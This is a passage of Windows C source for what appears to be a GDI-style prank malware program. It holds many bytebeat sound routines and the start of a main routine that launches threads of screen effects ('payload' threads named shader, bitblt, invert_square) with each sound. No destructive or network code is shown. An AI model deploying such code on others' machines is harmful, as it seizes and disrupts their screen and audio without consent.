	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound3() {
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((t << t * rand() | (0xCA98CA98 >> (t >> 11)) * (t + 2) / 2 | t << 10));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound4() {
	int nSamplesPerSec = 10086, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(114 * (t >> 5 | t >> 1 | t >> 4) + (t >> 19 & t << 1) ^ 9 * (t >> 8 | t | t >> 10) + 32 * (t >> t & 32));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound5() {
	int nSamplesPerSec = 44100, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(t - ((t >> (t & 8192 ? 3 : 2) >> 2 | t) & t >> 10));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound6() {
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(t * tan(42 & t >> 10) + 256 * tan(1 - t % 2048));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound7() {
	int nSamplesPerSec = 32000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((cbrt(cos((t * (1 + (t >> 14 | t >> 51) % 4)) / 19)) * (16 + (t >> 8 & 42)) + (int)(sin((t * t * t / 9) / 41) * 10) + 70));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound8() {
	int nSamplesPerSec = 8888, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((7 * t & t >> 8 | (78 * t >> 1)) >> (int)tan(t / 64 & t >> 9 | t >> 1 | t >> t / 64));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound9() {
	int nSamplesPerSec = 11111, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(255 & t * (int)cos(127 & t * (int)cos(234 & t >> 8 & t >> 3) >> (3 & t >> 14)));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound10() {
	int nSamplesPerSec = 9999, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((int)((t % 128000 < 2000) ? (t * 4.488) : (t % 128000 < 4000) ? (t * 5.656) : (t % 128000 < 6000) ? (t * 6.728) : (t % 128000 < 10000) ? (t * 7.552) : (t % 128000 < 14000) ? (t * 4.488) : (t % 128000 < 18000) ? (t * 6.728) : (t % 128000 < 22000) ? (t * 4.488) : (t % 128000 < (22000 + (4000 / 3) * 2)) ? (t * 4.24) : (t % 128000 < (22000 + (4000 / 3) * 4)) ? (t * 6.728) : (t % 128000 < 32000) ? (t * 5.656) : (t % 128000 < 34000) ? (t * 4.488) : (t % 128000 < 36000) ? (t * 5.656) : (t % 128000 < 38000) ? (t * 6.728) : (t % 128000 < 42000) ? (t * 7.552) : (t % 128000 < 46000) ? (t * 4.488) : (t % 128000 < 50000) ? (t * 6.728) : (t % 128000 < 54000) ? (t * 4.488) : (t % 128000 < (54000 + (4000 / 3) * 2)) ? (t * 4.24) : (t % 128000 < (54000 + (4000 / 3) * 4)) ? (t * 6.728) : (t % 128000 < 64000) ? (t * 5.656) : (t % 128000 < 66000) ? (t * 8.976) : (t % 128000 < 68000) ? (t * 10.08) : (t % 128000 < 70000) ? (t * 11.312) : (t % 128000 < 74000) ? (t * 22.624) : (t % 128000 < 78000) ? (t * 13.456) : (t % 128000 < 82000) ? (t * 20.184) : (t % 128000 < 86000) ? (t * 13.456) : (t % 128000 < (86000 + (4000 / 3) * 2)) ? (t * 11.312) : (t % 128000 < (86000 + (4000 / 3) * 4)) ? (t * 17.96) : (t % 128000 < 96000) ? (t * 13.456) : (t % 128000 < 98000) ? (t * 4.488) : (t % 128000 < 100000) ? (t * 5.656) : (t % 128000 < 102000) ? (t * 6.728) : (t % 128000 < 106000) ? (t * 7.552) : (t % 128000 < 110000) ? (t * 4.488) : (t % 128000 < 114000) ? (t * 6.728) : (t % 128000 < 118000) ? (t * 4.488) : (t % 128000 < (118000 + (4000 / 3) * 2)) ? (t * 4.232) : (t % 128000 < (118000 + (4000 / 3) * 4)) ? (t * 5.04) : (t % 128000 < 128000) ? (t * 4.488) : 0) - t & t >> 8);
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound11() {
	int nSamplesPerSec = 11111, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((((int)((t % 114000 < 3000) ? (t * 5.992) : (t % 114000 < 6000) ? (t * 5.992) : (t % 114000 < 9000) ? (t * 5.992) : (t % 114000 < 11000) ? (t * 5.656) : (t % 114000 < 13000) ? (t * 5.04) : (t % 114000 < 19000) ? (t * 5.656) : (t % 114000 < 23000) ? (t * 6.728) : (t % 114000 < 25000) ? (t * 4.488) : (t % 114000 < 27000) ? (t * 5.04) : (t % 114000 < 29000) ? (t * 5.656) : (t % 114000 < 33000) ? (t * 5.656) : (t % 114000 < 37000) ? (t * 5.656) : (t % 114000 < 40000) ? (t * 5.656) : (t % 114000 < 42000) ? (t * 5.04) : (t % 114000 < 44000) ? (t * 4.488) : (t % 114000 < 49000) ? (t * 4.24) : (t % 114000 < 51000) ? (t * 3.36) : (t % 114000 < 55000) ? (t * 3.36) : (t % 114000 < 57000) ? (t * 3) : (t % 114000 < 61000) ? (t * 2.832) : (t % 114000 < 64000) ? (t * 5.992) : (t % 114000 < 67000) ? (t * 5.992) : (t % 114000 < 70000) ? (t * 5.992) : (t % 114000 < 72000) ? (t * 5.656) : (t % 114000 < 74000) ? (t * 5.04) : (t % 114000 < 80000) ? (t * 5.656) : (t % 114000 < 84000) ? (t * 6.728) : (t % 114000 < 86000) ? (t * 4.488) : (t % 114000 < 88000) ? (t * 5.04) : (t % 114000 < 90000) ? (t * 5.656) : (t % 114000 < 94000) ? (t * 5.656) : (t % 114000 < 98000) ? (t * 5.656) : (t % 114000 < 101000) ? (t * 5.656) : (t % 114000 < 103000) ? (t * 5.04) : (t % 114000 < 105000) ? (t * 4.488) : (t % 114000 < 114000) ? (t * 4.24) : 0) | (t ^ t >> t))));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound12() {
	int x, y;
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(sin(2e3 / (y = t & 4095)) * 25 + (x = t * (15 & 0x9866 >> (t >> 12 & 12)) / 6 & 127) * y / 1e4 + ((t >> 6 ^ t >> 8 | t >> 12 | x) & 63));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound13() {
	int nSamplesPerSec = 22050, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(t >> 6 ^ t & t >> 9 ^ t >> 12 | (t << (t >> 6) % 4 ^ -t & -t >> 13) % 128 ^ -t >> 1);
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound14() {
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(t * ((t >> 9 | t >> 13) & 25 & t >> 6));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound15() {
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(t / 4 >> t / 4 | t >> 2);
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound16() {//credits to pankoza
	int nSamplesPerSec = 22050, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((sin((t ^ t >> 12) * t >> 8) * 127));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound17() {//a callback from Platinum.exe
	int nSamplesPerSec = 22050, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((((t * (t >> 13 | t >> 8) | t >> 16 ^ t) + 64)));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound18() {//another callback from Platinum.exe
	int nSamplesPerSec = 32000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((t * (6 + (((t >> 24 & 14 ? t >> (t >> 18 & 1 ? 13 : 12) & 3 : 1) ^ t >> (t >> 118 & 4 ? 514 : 13) & (0 - t >> (t >> 18 & 1 ? 15 : 14) & 3 ? 1 : 2)) + 3 & 3)) / 8 % 128 + (t * (6 + (t >> 16 & 3)) / 16 | t >> 7 ^ t >> 9) % 128)));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound19() {//credits to fr4ctalz
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(64 * sin((t >> 9 ^ (t >> 9) - 1 ^ 1) % 13 * t / 10) + 128);
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound20() {
	int nSamplesPerSec = 32000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(t * rand());
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
//---------------------------------------------------main-------------------------
void mainpayloads() {
	sleep(5000);
	HANDLE payload0 = CreateThread(NULL, 0, curfun, NULL, 0, NULL);
	sleep(5000);
	HANDLE payload00 = CreateThread(NULL, 0, textz, NULL, 0, NULL);
	HANDLE payload1_num1 = CreateThread(NULL, 0, bitblt1, NULL, 0, NULL);
	HANDLE payload1_num2 = CreateThread(NULL, 0, plgblt1, NULL, 0, NULL);
	HANDLE payload1_num3 = CreateThread(NULL, 0, mixgraphic, NULL, 0, NULL);
	HANDLE payload1_num4 = CreateThread(NULL, 0, cube, NULL, 0, NULL);
	sound1();
	TerminateThread(payload1_num1, 0);
	TerminateThread(payload1_num2, 0);
	TerminateThread(payload1_num3, 0);
	refreshscr();
	Sleep(100);
	HANDLE payload2 = CreateThread(NULL, 0, shader1, NULL, 0, NULL);
	sound2();
	TerminateThread(payload2, 0);
	refreshscr();
	Sleep(100);
	HANDLE payload3 = CreateThread(NULL, 0, shader2, NULL, 0, NULL);
	sound3();
	TerminateThread(payload3, 0);
	refreshscr();
	Sleep(100);
	HANDLE payload4 = CreateThread(NULL, 0, shader3, NULL, 0, NULL);
	sound4();
	TerminateThread(payload4, 0);
	refreshscr();
	Sleep(100);
	HANDLE payload5_num1 = CreateThread(NULL, 0, bitblt2, NULL, 0, NULL);
	HANDLE payload5_num2 = CreateThread(NULL, 0, bitblt3, NULL, 0, NULL);
	HANDLE payload5_num3 = CreateThread(NULL, 0, invert_square, NULL, 0, NULL);
	HANDLE payload5_num4 = CreateThread(NULL, 0, colourful_circle, NULL, 0, NULL);
	sound5();
	TerminateThread(payload5_num1, 0);
	TerminateThread(payload5_num2, 0);
	TerminateThread(payload5_num3, 0);
	TerminateThread(payload5_num4, 0);
	refreshscr();
	Sleep(100);
	HANDLE payload6_num1 = CreateThread(NULL, 0, shader4, NULL, 0, NULL);
	HANDLE payload6_num2 = CreateThread(NULL, 0, text1, NULL, 0, NULL);
	sound6();
	TerminateThread(payload6_num1, 0);
	refreshscr();
	Sleep(100);
	HANDLE payload7 = CreateThread(NULL, 0, shader5, NULL, 0, NULL);
	sound7();
	TerminateThread(payload7, 0);
	refreshscr();
	Sleep(100);
	HANDLE payload8 = CreateThread(NULL, 0, shader6, NULL, 0, NULL);
	sound8();
	TerminateThread(payload8, 0);
	refreshscr();
	Sleep(100);
	HANDLE payload9 = CreateThread(NULL, 0, shader7, NULL, 0, NULL);
	sound9();
	TerminateThread(payload9, 0);
	refreshscr();
	Sleep(100);
	HANDLE payload10 = CreateThread(NULL, 0, blur1, NULL, 0, NULL);
	sound10();
	TerminateThread(payload10, 0);
	refreshscr();
	Sleep(100);
	HANDLE payload11_num1 = CreateThread(NULL, 0, neonz, NULL, 0, NULL);
	HANDLE payload11_num2 = CreateThread(NULL, 0, realcube, NULL, 0, NULL);
	sound11();
